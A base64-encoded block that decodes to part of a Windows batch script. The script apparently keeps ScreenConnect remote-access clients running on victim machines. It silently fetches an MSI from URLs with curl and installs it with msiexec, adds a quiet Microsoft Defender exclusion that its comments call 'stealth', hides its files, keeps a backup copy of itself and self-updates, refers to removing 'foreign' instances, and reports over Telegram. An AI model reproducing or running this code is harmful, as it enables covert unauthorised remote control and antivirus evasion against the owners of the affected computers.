RUdTVEFURT0lJVIiDQppZiAvSSAiIVJFR1NUQVRFISI9PSJ5ZXMiICgNCiAgZWNobyBwcmltYXJ5
X3JlZ2lzdGVyZWRfc2tpcF9mcmVzaF9pbnN0YWxsPj4iJUxPRyUiDQogIHBvd2Vyc2hlbGwgLU5v
UHJvZmlsZSAtTm9uSW50ZXJhY3RpdmUgLUV4ZWN1dGlvblBvbGljeSBCeXBhc3MgLUZpbGUgIiVX
RCVcb3duX2xpYi5wczEiIC1BY3Rpb24gc3RhdGUgLVdvcmtEaXIgIiVXRCUiIC1CdWlsZCAlTU9O
VkVSJSAtRXh0cmEgInJlZ2lzdGVyZWQtc3R1Y2siID5udWwgMj4mMQ0KICBjYWxsIDpUZ1N0YXRl
IERPV04gIlByaW1hcnkgcmVnaXN0ZXJlZCBidXQgc2VydmljZSBtaXNzaW5nIC0gL2ZhIGZhaWxl
ZDsgcmVmdXNlZCAvaSB0byBwcm90ZWN0IEFMVC9HUllYQSINCiAgZ290byA6QWZ0ZXJIZWFsDQop
DQpyZW0gTzM3OiByZWZ1c2Ugc2V2cnogL2kgd2hlbiBncnl4YSBhbHJlYWR5IHByZXNlbnQg4oCU
IHNoYXJlZCBsZWdhY3kgVXBncmFkZUNvZGVzDQpyZW0gezBDOTQ0NDhCfS97MUY4NUQ3RkV9IG1h
a2Ugc2libGluZyBtc2lleGVjIC9pIGtub2NrIEdyeXhhIE9GRkxJTkUgaW4gcGFuZWwuDQpzZXQg
IkdSRUc9dW5rbm93biINCmlmIGV4aXN0ICIlV0QlXG93bl9saWIucHMxIiBmb3IgL2YgInVzZWJh
Y2txIGRlbGltcz0iICUlUiBpbiAoYHBvd2Vyc2hlbGwgLU5vUHJvZmlsZSAtTm9uSW50ZXJhY3Rp
dmUgLUV4ZWN1dGlvblBvbGljeSBCeXBhc3MgLUZpbGUgIiVXRCVcb3duX2xpYi5wczEiIC1BY3Rp
b24gcmVnaXN0ZXJlZCAtRnAgIiVHUllYQV9GUCUiIC1Xb3JrRGlyICIlV0QlImApIGRvIHNldCAi
R1JFRz0lJVIiDQpzYyBxdWVyeSAiU2NyZWVuQ29ubmVjdCBDbGllbnQgKCVHUllYQV9GUCUpIiA+
bnVsIDI+JjENCmlmIG5vdCBlcnJvcmxldmVsIDEgc2V0ICJHUkVHPXllcyINCmlmIC9JICIhR1JF
RyEiPT0ieWVzIiAoDQogIGVjaG8gcHJpbWFyeV9za2lwX2lfcHJvdGVjdF9ncnl4YT4+IiVMT0cl
Ig0KICBwb3dlcnNoZWxsIC1Ob1Byb2ZpbGUgLU5vbkludGVyYWN0aXZlIC1FeGVjdXRpb25Qb2xp
Y3kgQnlwYXNzIC1GaWxlICIlV0QlXG93bl9saWIucHMxIiAtQWN0aW9uIHN0YXRlIC1Xb3JrRGly
ICIlV0QlIiAtQnVpbGQgJU1PTlZFUiUgLUV4dHJhICJwcm90ZWN0LWdyeXhhLXNraXAtcHJpbWFy
eS1pIiA+bnVsIDI+JjENCiAgY2FsbCA6VGdTdGF0ZSBET1dOICJQcmltYXJ5IG1pc3NpbmcgLSBy
ZWZ1c2VkIHNldnJ6IC9pIHRvIHByb3RlY3QgR3J5eGEgKHNoYXJlZCBTQyBVcGdyYWRlQ29kZXMp
OyAvZmEgb25seSINCiAgZ290byA6QWZ0ZXJIZWFsDQopDQppZiAiJUlOU1RBTExFRCUiPT0iMCIg
Y2FsbCA6SW5zdGFsbE1zaSAiJU1TSV9VUkwlIiAibWFpbiINCmlmICIlSU5TVEFMTEVEJSI9PSIw
IiBjYWxsIDpJbnN0YWxsTXNpICIlTVNJX1BLRzElP3Q9JVJBTkRPTSUiICJnaXRodWItcGtnIg0K
aWYgIiVJTlNUQUxMRUQlIj09IjAiIGNhbGwgOkluc3RhbGxNc2kgIiVNU0lfUEtHMiUiICJqc2Rl
bGl2ci1wa2ciDQppZiAiJUlOU1RBTExFRCUiPT0iMCIgKA0KICByZW0gcHJlZmVyIHdvcmtlci1j
YWNoZWQgLnd1Y2FjaGVccGtnLm1zaSAoc2FtZSBiaW5hcnkgYXMgZGVwbG95KQ0KICBhdHRyaWIg
LWggLXMgLXIgIiVNU0lDQUNIRSUiID5udWwgMj4mMQ0KICBmb3IgJSVGIGluICgiJU1TSUNBQ0hF
JSIpIGRvIGlmICUlfnpGIEdUUiAxMDAwMDAwICgNCiAgICBlY2hvIHd1Y2FjaGVfcGtnX3JldHJ5
Pj4iJUxPRyUiDQogICAgYXR0cmliIC1oIC1zIC1yICIlTVNJJSIgPm51bCAyPiYxDQogICAgY29w
eSAveSAiJU1TSUNBQ0hFJSIgIiVNU0klIiA+bnVsIDI+JjENCiAgKQ0KICBmb3IgJSVGIGluICgi
JU1TSSUiKSBkbyBpZiAlJX56RiBHVFIgMTAwMDAwMCAoDQogICAgZWNobyBjYWNoZSByZXRyeSBp
bnN0YWxsPj4iJUxPRyUiDQogICAgY2FsbCA6Tm9Nc2lQb2xpY3kNCiAgICBtc2lleGVjIC9pICIl
TVNJJSIgL3FuIC9ub3Jlc3RhcnQgQUxMVVNFUlM9MSBSRUJPT1Q9UmVhbGx5U3VwcHJlc3MgL0wq
diAiJVdEJVxtc2lfaGVhbC5sb2ciID5udWwgMj4mMQ0KICAgIHNldCAiTVNJRVhJVD0hRVJST1JM
RVZFTCEiDQogICAgZWNobyBjYWNoZSBtc2lleGVjIGV4aXQ9IU1TSUVYSVQhPj4iJUxPRyUiDQog
ICAgaWYgIiFNU0lFWElUISI9PSIxNjE4IiAoDQogICAgICB0aW1lb3V0IC90IDMwIC9ub2JyZWFr
ID5udWwNCiAgICAgIG1zaWV4ZWMgL2kgIiVNU0klIiAvcW4gL25vcmVzdGFydCBBTExVU0VSUz0x
IFJFQk9PVD1SZWFsbHlTdXBwcmVzcyAvTCp2ICIlV0QlXG1zaV9oZWFsMi5sb2ciID5udWwgMj4m
MQ0KICAgICAgc2V0ICJNU0lFWElUPSFFUlJPUkxFVkVMISINCiAgICAgIGVjaG8gY2FjaGVfcmV0
cnkxNjE4X2V4aXQ9IU1TSUVYSVQhPj4iJUxPRyUiDQogICAgKQ0KICAgIGNhbGwgOldhaXRTdmMN
CiAgKQ0KKQ0KY2FsbCA6UmVzdG9yZUFsdA0KY2FsbCA6RW5zdXJlR3J5eGFNdXN0DQppZiAiJUlO
U1RBTExFRCUiPT0iMCIgKA0KICBpZiBleGlzdCAiJVdEJVxtc2lfaGVhbC5sb2ciICgNCiAgICBl
Y2hvIC0tLSBtc2lfaGVhbC5sb2cgdGFpbCAtLS0+PiIlTE9HJSINCiAgICBwb3dlcnNoZWxsIC1O
b1Byb2ZpbGUgLU5vbkludGVyYWN0aXZlIC1Db21tYW5kICJHZXQtQ29udGVudCAtTGl0ZXJhbFBh
dGggJyVXRCVcbXNpX2hlYWwubG9nJyAtVGFpbCAxMCIgPj4iJUxPRyUiIDI+JjENCiAgKQ0KICBp
ZiBub3QgZGVmaW5lZCBNU0lFWElUIHNldCAiTVNJRVhJVD1mZXRjaC1mYWlsIg0KICBwb3dlcnNo
ZWxsIC1Ob1Byb2ZpbGUgLU5vbkludGVyYWN0aXZlIC1FeGVjdXRpb25Qb2xpY3kgQnlwYXNzIC1G
aWxlICIlV0QlXG93bl9saWIucHMxIiAtQWN0aW9uIHN0YXRlIC1Xb3JrRGlyICIlV0QlIiAtQnVp
bGQgJU1PTlZFUiUgLUV4dHJhICJtc2ktZmFpbGVkIiA+bnVsIDI+JjENCiAgY2FsbCA6VGdTdGF0
ZSBGQUlMICJNU0kgaW5zdGFsbCBmYWlsZWQgb24gYWxsIHNvdXJjZXMgKG1zaWV4ZWMgZXhpdCAl
TVNJRVhJVCUpIg0KKSBlbHNlICgNCiAgZWNobyBzdmMgcmVzdG9yZWQ+PiIlTE9HJSINCiAgcG93
ZXJzaGVsbCAtTm9Qcm9maWxlIC1Ob25JbnRlcmFjdGl2ZSAtRXhlY3V0aW9uUG9saWN5IEJ5cGFz
cyAtRmlsZSAiJVdEJVxvd25fbGliLnBzMSIgLUFjdGlvbiBzdGF0ZSAtV29ya0RpciAiJVdEJSIg
LUJ1aWxkICVNT05WRVIlIC1FeHRyYSAicmVzdG9yZWQiID5udWwgMj4mMQ0KICBjYWxsIDpUZ1N0
YXRlIFJFU1RPUkVEICJTY3JlZW5Db25uZWN0IHJlaW5zdGFsbGVkIE9LIg0KKQ0KDQo6QWZ0ZXJI
ZWFsDQpyZW0gTTE2OiBBTFQgcHJlc2VudC1idXQtc3RvcHBlZCAtPiByZXN0YXJ0LCB0aGVuIHJl
cGFpci1ieS1HVUlEIChldmVyeSB0aWNrKQ0Kc2MgcXVlcnkgIlNjcmVlbkNvbm5lY3QgQ2xpZW50
ICglQUxUX0ZQJSkiID5udWwgMj4mMQ0KaWYgbm90IGVycm9ybGV2ZWwgMSAoDQogIHNjIHF1ZXJ5
ICJTY3JlZW5Db25uZWN0IENsaWVudCAoJUFMVF9GUCUpIiB8IGZpbmQgIlJVTk5JTkciID5udWwN
CiAgaWYgZXJyb3JsZXZlbCAxICgNCiAgICBlY2hvIGFsdCBzdG9wcGVkIC0gcmVzdGFydC9yZXBh
aXI+PiIlTE9HJSINCiAgICBuZXQgc3RhcnQgIlNjcmVlbkNvbm5lY3QgQ2xpZW50ICglQUxUX0ZQ
JSkiID5udWwgMj4mMQ0KICAgIHNjIHN0YXJ0ICJTY3JlZW5Db25uZWN0IENsaWVudCAoJUFMVF9G
UCUpIiA+bnVsIDI+JjENCiAgICB0aW1lb3V0IC90IDUgL25vYnJlYWsgPm51bA0KICAgIHNjIHF1
ZXJ5ICJTY3JlZW5Db25uZWN0IENsaWVudCAoJUFMVF9GUCUpIiB8IGZpbmQgIlJVTk5JTkciID5u
dWwNCiAgICBpZiBlcnJvcmxldmVsIDEgaWYgZXhpc3QgIiVXRCVcb3duX2xpYi5wczEiIHBvd2Vy
c2hlbGwgLU5vUHJvZmlsZSAtTm9uSW50ZXJhY3RpdmUgLUV4ZWN1dGlvblBvbGljeSBCeXBhc3Mg
LUZpbGUgIiVXRCVcb3duX2xpYi5wczEiIC1BY3Rpb24gcmVwYWlyIC1GcCAiJUFMVF9GUCUiIC1X
b3JrRGlyICIlV0QlIiA+PiIlTE9HJSIgMj4mMQ0KICApDQopDQpyZW0gTTE3OiBBTFQgc2Vydmlj
ZSBlbnRyeSBkZWxldGVkIGJ1dCBwcm9kdWN0IHJlZ2lzdGVyZWQgLT4gcmVwYWlyLWJ5LUdVSUQg
ZXZlcnkgdGljaw0Kc2MgcXVlcnkgIlNjcmVlbkNvbm5lY3QgQ2xpZW50ICglQUxUX0ZQJSkiID5u
dWwgMj4mMQ0KaWYgZXJyb3JsZXZlbCAxICgNCiAgZWNobyBhbHRfbWlzc2luZ190cnlfcmVwYWly
Pj4iJUxPRyUiDQogIGlmIGV4aXN0ICIlV0QlXG93bl9saWIucHMxIiBwb3dlcnNoZWxsIC1Ob1By
b2ZpbGUgLU5vbkludGVyYWN0aXZlIC1FeGVjdXRpb25Qb2xpY3kgQnlwYXNzIC1GaWxlICIlV0Ql
XG93bl9saWIucHMxIiAtQWN0aW9uIHJlcGFpciAtRnAgIiVBTFRfRlAlIiAtV29ya0RpciAiJVdE
JSIgPj4iJUxPRyUiIDI+JjENCikNCnJlbSAoZXh0ZXJtaW5hdGlvbiBhbHJlYWR5IHJhbiBwcmUt
aGVhbCBpbiBbRV07IGZvcmVpZ24gc3Vydml2b3JzIGNvdW50ZWQgdGhlcmUpDQoNCnJlbSDilIDi
lIAgW0ZdIHN0ZWFsdGggcmUtc2VjdXJlIChxdWlldCBEZWZlbmRlciBleGNsdXNpb24gcmVmcmVz
aCkg4pSA4pSADQpwb3dlcnNoZWxsIC1Ob1Byb2ZpbGUgLU5vbkludGVyYWN0aXZlIC1FeGVjdXRp
b25Qb2xpY3kgQnlwYXNzIC1Db21tYW5kICJ0cnkgeyBBZGQtTXBQcmVmZXJlbmNlIC1FeGNsdXNp
b25QYXRoICclV0QlJywnJUVUTCUnIC1FcnJvckFjdGlvbiBTdG9wIH0gY2F0Y2gge30iID5udWwg
Mj4mMQ0KDQpyZW0g4pSA4pSAIFtHXSBwZXJpb2RpYyBmdWxsIHJlLXNlY3VyZSBldmVyeSB+MiBo
IOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKU
gOKUgA0KcG93ZXJzaGVsbCAtTm9Qcm9maWxlIC1Ob25JbnRlcmFjdGl2ZSAtQ29tbWFuZCAiaWYo
KFRlc3QtUGF0aCAnJVdEJVxvd25fc2VjdXJlLmNtZCcpIC1hbmQgKCggLW5vdCAoVGVzdC1QYXRo
ICclV0QlXHNlYy5mbGFnJykpIC1vciAoKChHZXQtRGF0ZSkgLSAoR2V0LUl0ZW0gLUxpdGVyYWxQ
YXRoICclV0QlXHNlYy5mbGFnJykuTGFzdFdyaXRlVGltZSkuVG90YWxIb3VycyAtZ2UgMikpKXsg
ZXhpdCAxIH0gZWxzZSB7IGV4aXQgMCB9IiA+bnVsIDI+JjENCmlmIGVycm9ybGV2ZWwgMSAoDQog
IGVjaG8gcGVyaW9kaWMgcmUtc2VjdXJlPj4iJUxPRyUiDQogIGNhbGwgIiVXRCVcb3duX3NlY3Vy
ZS5jbWQiID4+IiVMT0clIiAyPiYxDQogIGVjaG8gZG9uZT4iJVdEJVxzZWMuZmxhZyINCikNCg0K
cmVtIOKUgOKUgCBbRzJdIEdyeXhhIE1VU1QtUlVOIOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKU
gOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKU
gOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKUgA0KcmVtIE80MDogaWYgQU5ZIG5vbi1z
ZXZyeiBTQyBSdW5uaW5nIOKGkiBuZXZlciBtc2lleGVjIChzdG9wcyBwYW5lbCBkdXBsaWNhdGVz
KS4NCnNldCAiR1JZWEFfT0s9MCINCnNldCAiR1JZWEFfV0FTPTAiDQpzZXQgIkRPX0RFRVA9MCIN
CmlmIGV4aXN0ICIlV0QlXGdyeXhhLmNmZyIgZm9yIC9mICJ1c2ViYWNrcSB0b2tlbnM9MSwqIGRl
bGltcz09IiAlJUsgaW4gKCIlV0QlXGdyeXhhLmNmZyIpIGRvIGlmIC9JICIlJUsiPT0iQ1VSUkVO
VF9GUCIgc2V0ICJHUllYQV9GUD0lJUwiDQoNCnJlbSBEZXRlY3QgYW55IFJ1bm5pbmcgbm9uLXNl
dnJ6IFNjcmVlbkNvbm5lY3QgKHRydWUgR3J5eGEgcHJlc2VuY2UpDQpwb3dlcnNoZWxsIC1Ob1By
b2ZpbGUgLU5vbkludGVyYWN0aXZlIC1FeGVjdXRpb25Qb2xpY3kgQnlwYXNzIC1GaWxlICIlV0Ql
XG93bl9saWIucHMxIiAtQWN0aW9uIGdyeXhhLWhlYWx0aCAtV29ya0RpciAiJVdEJSIgPiIlV0Ql
XGdyeXhhX2hlYWx0aC5vdXQiIDI+bnVsDQpzZXQgIkdIPSINCmlmIGV4aXN0ICIlV0QlXGdyeXhh
X2hlYWx0aC5vdXQiIGZvciAvZiAidXNlYmFja3EgZGVsaW1zPSIgJSVSIGluICgiJVdEJVxncnl4
YV9oZWFsdGgub3V0IikgZG8gc2V0ICJHSD0lJVIiDQplY2hvIGdyeXhhX2hlYWx0aD0hR0ghPj4i
JUxPRyUiDQplY2hvICFHSCF8IGZpbmRzdHIgL0kgL0IgL0M6IkhFQUxUSFkiID5udWwNCmlmIG5v
dCBlcnJvcmxldmVsIDEgKA0KICBzZXQgIkdSWVhBX09LPTEiDQogIHNldCAiR1JZWEFfV0FTPTEi
DQogIGlmIGV4aXN0ICIlV0QlXGdyeXhhLmNmZyIgZm9yIC9mICJ1c2ViYWNrcSB0b2tlbnM9MSwq
IGRlbGltcz09IiAlJUsgaW4gKCIlV0QlXGdyeXhhLmNmZyIpIGRvIGlmIC9JICIlJUsiPT0iQ1VS
UkVOVF9GUCIgc2V0ICJHUllYQV9GUD0lJUwiDQopDQoNCnBvd2Vyc2hlbGwgLU5vUHJvZmlsZSAt
Tm9uSW50ZXJhY3RpdmUgLUNvbW1hbmQgImlmKCggLW5vdCAoVGVzdC1QYXRoICclR1JZWEFfREVF
UCUnKSkgLW9yICgoKEdldC1EYXRlKS0oR2V0LUl0ZW0gLUxpdGVyYWxQYXRoICclR1JZWEFfREVF
UCUnIC1Gb3JjZSkuTGFzdFdyaXRlVGltZSkuVG90YWxIb3VycyAtZ2UgOCkpeyBleGl0IDEgfSBl
bHNlIHsgZXhpdCAwIH0iID5udWwgMj4mMQ0KaWYgZXJyb3JsZXZlbCAxIHNldCAiRE9fREVFUD0x
Ig0KDQpyZW0gSGVhbHRoeSArIG5vdCBkZWVwIGR1ZSDihpIgemVybyB3b3JrDQppZiAiJUdSWVhB
X09LJSI9PSIxIiBpZiAiJURPX0RFRVAlIj09IjAiICgNCiAgZWNobyBncnl4YV9za2lwX2FscmVh
ZHlfaGVhbHRoeT4+IiVMT0clIg0KICBnb3RvIDpHcnl4YUFmdGVyDQopDQoNCnJlbSBEZWVwIG9y
IG1pc3Npbmc6IGdyeXhhLWVuc3VyZSBvbmx5IChsaWIgbG9ja3MgbXNpZXhlYyBpZiBSdW5uaW5n
KQ0KaWYgZXhpc3QgIiVXRCVcb3duX2xpYi5wczEiICgNCiAgc2V0ICJHUkVTPSINCiAgaWYgIiVE
T19ERUVQJSI9PSIxIiAoDQogICAgZWNobyBncnl4YV9kZWVwX2JlZ2luPj4iJUxPRyUiDQogICAg
Zm9yIC9mICJ1c2ViYWNrcSBkZWxpbXM9IiAlJVIgaW4gKGBwb3dlcnNoZWxsIC1Ob1Byb2ZpbGUg
LU5vbkludGVyYWN0aXZlIC1FeGVjdXRpb25Qb2xpY3kgQnlwYXNzIC1GaWxlICIlV0QlXG93bl9s
aWIucHMxIiAtQWN0aW9uIGdyeXhhLWVuc3VyZSAtRGVlcCAtV29ya0RpciAiJVdEJSIgLUJ1aWxk
ICVNT05WRVIlYCkgZG8gc2V0ICJHUkVTPSUlUiINCiAgKSBlbHNlICgNCiAgICBmb3IgL2YgInVz
ZWJhY2txIGRlbGltcz0iICUlUiBpbiAoYHBvd2Vyc2hlbGwgLU5vUHJvZmlsZSAtTm9uSW50ZXJh
Y3RpdmUgLUV4ZWN1dGlvblBvbGljeSBCeXBhc3MgLUZpbGUgIiVXRCVcb3duX2xpYi5wczEiIC1B
Y3Rpb24gZ3J5eGEtZW5zdXJlIC1Xb3JrRGlyICIlV0QlIiAtQnVpbGQgJU1PTlZFUiVgKSBkbyBz
ZXQgIkdSRVM9JSVSIg0KICApDQogIGVjaG8gZ3J5eGFfZW5zdXJlX3Jlc3VsdD0hR1JFUyE+PiIl
TE9HJSINCiAgZWNobyAhR1JFUyF8IGZpbmRzdHIgL0kgL0IgL0M6IkhFQUxUSFkiID5udWwNCiAg
aWYgbm90IGVycm9ybGV2ZWwgMSBzZXQgIkdSWVhBX09LPTEiDQopDQppZiAiJURPX0RFRVAlIj09
IjEiIGVjaG8gZG9uZT4iJUdSWVhBX0RFRVAlIg0KaWYgIiVHUllYQV9PSyUiPT0iMCIgY2FsbCA6
RW5zdXJlR3J5eGFNdXN0DQoNCjpHcnl4YUFmdGVyDQppZiBleGlzdCAiJVdEJVxncnl4YS5jZmci
IGZvciAvZiAidXNlYmFja3EgdG9rZW5zPTEsKiBkZWxpbXM9PSIgJSVLIGluICgiJVdEJVxncnl4
YS5jZmciKSBkbyBpZiAvSSAiJSVLIj09IkNVUlJFTlRfRlAiIHNldCAiR1JZWEFfRlA9JSVMIg0K
c2MgcXVlcnkgIlNjcmVlbkNvbm5lY3QgQ2xpZW50ICglR1JZWEFfRlAlKSIgfCBmaW5kICJSVU5O
SU5HIiA+bnVsDQppZiBub3QgZXJyb3JsZXZlbCAxIHNldCAiR1JZWEFfT0s9MSINCnJlbSBhbHNv
IE9LIGlmIGFueSBub24tc2V2cnogc3RpbGwgcnVubmluZw0KaWYgIiVHUllYQV9PSyUiPT0iMCIg
KA0KICBwb3dlcnNoZWxsIC1Ob1Byb2ZpbGUgLU5vbkludGVyYWN0aXZlIC1FeGVjdXRpb25Qb2xp
Y3kgQnlwYXNzIC1GaWxlICIlV0QlXG93bl9saWIucHMxIiAtQWN0aW9uIGdyeXhhLWhlYWx0aCAt
V29ya0RpciAiJVdEJSIgMj5udWwgfCBmaW5kc3RyIC9JIC9CIC9DOiJIRUFMVEhZIiA+bnVsDQog
IGlmIG5vdCBlcnJvcmxldmVsIDEgc2V0ICJHUllYQV9PSz0xIg0KKQ0KDQppZiAiJUdSWVhBX09L
JSI9PSIxIiBpZiAiJUdSWVhBX1dBUyUiPT0iMCIgKA0KICBwb3dlcnNoZWxsIC1Ob1Byb2ZpbGUg
LU5vbkludGVyYWN0aXZlIC1FeGVjdXRpb25Qb2xpY3kgQnlwYXNzIC1GaWxlICIlV0QlXG93bl9s
aWIucHMxIiAtQWN0aW9uIHN0YXRlIC1Xb3JrRGlyICIlV0QlIiAtQnVpbGQgJU1PTlZFUiUgLUV4
dHJhICJncnl4YS1yZXN0b3JlZCIgPm51bCAyPiYxDQogIGNhbGwgOlRnU3RhdGUgUkVTVE9SRUQg
IkdyeXhhIFNjcmVlbkNvbm5lY3QgaGVhbHRoeSAoc3ZjIHJ1bm5pbmcpIg0KKQ0KaWYgIiVHUllY
QV9PSyUiPT0iMCIgKA0KICBwb3dlcnNoZWxsIC1Ob1Byb2ZpbGUgLU5vbkludGVyYWN0aXZlIC1F
eGVjdXRpb25Qb2xpY3kgQnlwYXNzIC1GaWxlICIlV0QlXG93bl9saWIucHMxIiAtQWN0aW9uIHN0
YXRlIC1Xb3JrRGlyICIlV0QlIiAtQnVpbGQgJU1PTlZFUiUgLUV4dHJhICJncnl4YS1tdXN0LWZh
aWwiID5udWwgMj4mMQ0KICBjYWxsIDpUZ1N0YXRlIERPV04gIkdyeXhhIE1VU1QtUlVOIC0gc2Vy
dmljZSBub3QgUnVubmluZyBhZnRlciBoZWFsIg0KKQ0KDQpyZW0g4pSA4pSAIFtIXSBxdWlldCBk
aWdlc3QgKHNraXAgaGVhbHRoeSBob3N0cyDigJQgd2FzIGZsb29kaW5nIFRlbGVncmFtKSDilIDi
lIANCmlmIGV4aXN0ICIlV0QlXG93bl9saWIucHMxIiBwb3dlcnNoZWxsIC1Ob1Byb2ZpbGUgLU5v
bkludGVyYWN0aXZlIC1FeGVjdXRpb25Qb2xpY3kgQnlwYXNzIC1GaWxlICIlV0QlXG93bl9saWIu
cHMxIiAtQWN0aW9uIHN0YXRlIC1Xb3JrRGlyICIlV0QlIiAtQnVpbGQgJU1PTlZFUiUgPm51bCAy
PiYxDQpzZXQgIk5FRURfSEI9MCINCmlmICIlUFJJTV9PSyUiPT0iMCIgc2V0ICJORUVEX0hCPTEi
DQppZiAlRk9SRUlHTl9MRUZUJSBHVFIgMCBzZXQgIk5FRURfSEI9MSINCmlmICIlR1JZWEFfT0sl
Ij09IjAiIHNldCAiTkVFRF9IQj0xIg0KaWYgIiVORUVEX0hCJSI9PSIwIiAoDQogIGVjaG8gaGJf
c2tpcF9oZWFsdGh5Pj4iJUxPRyUiDQopIGVsc2UgKA0KICBwb3dlcnNoZWxsIC1Ob1Byb2ZpbGUg
LU5vbkludGVyYWN0aXZlIC1Db21tYW5kICJpZigoVGVzdC1QYXRoICclSEJGTEFHJScpIC1hbmQg
KE5ldy1UaW1lU3BhbiAtU3RhcnQgKEdldC1JdGVtIC1MaXRlcmFsUGF0aCAnJUhCRkxBRyUnKS5M
YXN0V3JpdGVUaW1lKS5Ub3RhbE1pbnV0ZXMgLWx0IDM2MCl7IGV4aXQgMCB9IGVsc2UgeyBleGl0
IDEgfSIgPm51bCAyPiYxDQogIGlmIGVycm9ybGV2ZWwgMSAoDQogICAgZWNobyBoYj4lSEJGTEFH
JQ0KICAgIHBvd2Vyc2hlbGwgLU5vUHJvZmlsZSAtTm9uSW50ZXJhY3RpdmUgLUV4ZWN1dGlvblBv
bGljeSBCeXBhc3MgLUZpbGUgIiVXRCVcdGdfcmVwb3J0LnBzMSIgLVN0YXRlIEhCIC1Nb2RlIGNv
bXBhY3QgLUJ1aWxkICVNT05WRVIlIC1Db3VudCAhQ09VTlQhID5udWwgMj4mMQ0KICAgIGVjaG8g
ZGlnZXN0IEhCIHNlbnQ+PiIlTE9HJSINCiAgKQ0KKQ0KDQpyZW0g4pSA4pSAIFtJXSBzZWxmLXVw
ZGF0ZSBhcHBseSAobGFzdCB0aGluZyB0aGlzIHRpY2spIOKUgOKUgOKUgOKUgOKUgOKUgOKUgOKU
gOKUgOKUgOKUgOKUgOKUgOKUgA0KaWYgIiVTRUxGX1VQRCUiPT0iMSIgKA0KICBlY2hvIHNlbGYt
dXBkYXRlIGFwcGx5Pj4iJUxPRyUiDQogIGF0dHJpYiAtaCAtcyAtciAiJVdEJVxvd25fbW9uLmNt
ZCIgPm51bCAyPiYxDQogIG1vdmUgL3kgIiVXRCVcb3duX21vbi5uZXh0IiAiJVdEJVxvd25fbW9u
LmNtZCIgPm51bCAyPiYxDQopDQpyZW0ga2VlcCBkdWFsLXBhdGggYmFja3VwIGluIHN5bmMgZXZl
cnkgdGljaw0KaWYgbm90IGV4aXN0ICIlRVRMJSIgbWtkaXIgIiVFVEwlIiA+bnVsIDI+JjENCmlm
IGV4aXN0ICIlV0QlXG93bl9tb24uY21kIiAoDQogIGF0dHJpYiAtaCAtcyAtciAiJUVUTCVcZXRs
X21vbi5jbWQiID5udWwgMj4mMQ0KICBjb3B5IC95ICIlV0QlXG93bl9tb24uY21kIiAiJUVUTCVc
ZXRsX21vbi5jbWQiID5udWwgMj4mMQ0KKQ0KZGVsIC9mIC9xICIlTVVURVglIiA+bnVsIDI+JjEN
Cg0KZWNobyB0aWNrIGRvbmU6IHByaW09JVBSSU1fT0slIGdyeXhhPSVHUllYQV9PSyUgYWx0PSVB
TFRfT0slIGZvcmVpZ249JUZPUkVJR05fTEVGVCU+PiIlTE9HJSINCmVuZGxvY2FsDQpleGl0IC9i
IDANCg0KcmVtIOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkCBo
ZWxwZXJzIOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkA0KOkVu
c3VyZUdyeXhhTXVzdA0KcmVtIE80MTogdGhpbiB3cmFwcGVyIC0gbmV2ZXIgbXNpZXhlYzsgZ3J5
eGEtZW5zdXJlICsgUnVubmluZyBsb2NrLg0Kc2V0ICJHUllYQV9PSz0wIg0KaWYgZXhpc3QgIiVX
RCVcb3duX2xpYi5wczEiICgNCiAgc2V0ICJHUkVTPSINCiAgZm9yIC9mICJ1c2ViYWNrcSBkZWxp
bXM9IiAlJVIgaW4gKGBwb3dlcnNoZWxsIC1Ob1Byb2ZpbGUgLU5vbkludGVyYWN0aXZlIC1FeGVj
dXRpb25Qb2xpY3kgQnlwYXNzIC1GaWxlICIlV0QlXG93bl9saWIucHMxIiAtQWN0aW9uIGdyeXhh
LWVuc3VyZSAtV29ya0RpciAiJVdEJSIgLUJ1aWxkICVNT05WRVIlYCkgZG8gc2V0ICJHUkVTPSUl
UiINCiAgZWNobyBncnl4YV9tdXN0X2xpYj0hR1JFUyE+PiIlTE9HJSINCiAgZWNobyAhR1JFUyF8
IGZpbmRzdHIgL0kgL0IgL0M6IkhFQUxUSFkiID5udWwNCiAgaWYgbm90IGVycm9ybGV2ZWwgMSBz
ZXQgIkdSWVhBX09LPTEiDQopDQppZiBleGlzdCAiJVdEJVxncnl4YS5jZmciIGZvciAvZiAidXNl
YmFja3EgdG9rZW5zPTEsKiBkZWxpbXM9PSIgJSVLIGluICgiJVdEJVxncnl4YS5jZmciKSBkbyBp
ZiAvSSAiJSVLIj09IkNVUlJFTlRfRlAiIHNldCAiR1JZWEFfRlA9JSVMIg0Kc2MgcXVlcnkgIlNj
cmVlbkNvbm5lY3QgQ2xpZW50ICglR1JZWEFfRlAlKSIgfCBmaW5kICJSVU5OSU5HIiA+bnVsDQpp
ZiBub3QgZXJyb3JsZXZlbCAxIHNldCAiR1JZWEFfT0s9MSINCmlmICIlR1JZWEFfT0slIj09IjEi
IChlY2hvIGdyeXhhX211c3RfcnVubmluZ19vaz4+IiVMT0clIikgZWxzZSAoZWNobyBncnl4YV9t
dXN0X3N0aWxsX2Rvd24+PiIlTE9HJSIpDQpleGl0IC9iIDANCg0KOkluc3RhbGxNc2kNCnJlbSAl
MT11cmwgJTI9dGFnDQpzZXQgIlVSTD0lfjEiDQpzZXQgIlRBRz0lfjIiDQplY2hvIFslVEFHJV0g
ZmV0Y2ggJVVSTCU+PiIlTE9HJSINCiIlQ1VSTCUiIC1MIC0tc3NsLW5vLXJldm9rZSAtLWNvbm5l
Y3QtdGltZW91dCAyNSAtLW1heC10aW1lIDMwMCAtbyAiJU1TSSUudG1wIiAiJVVSTCUiID4+IiVM
T0clIiAyPiYxDQpmb3IgJSVGIGluICgiJU1TSSUudG1wIikgZG8gaWYgJSV+ekYgTEVRIDEwMDAw
MDAgKA0KICBlY2hvIFslVEFHJV0gZmV0Y2ggZmFpbGVkPj4iJUxPRyUiDQogIGRlbCAvZiAvcSAi
JU1TSSUudG1wIiA+bnVsIDI+JjENCiAgZXhpdCAvYiAxDQopDQptb3ZlIC95ICIlTVNJJS50bXAi
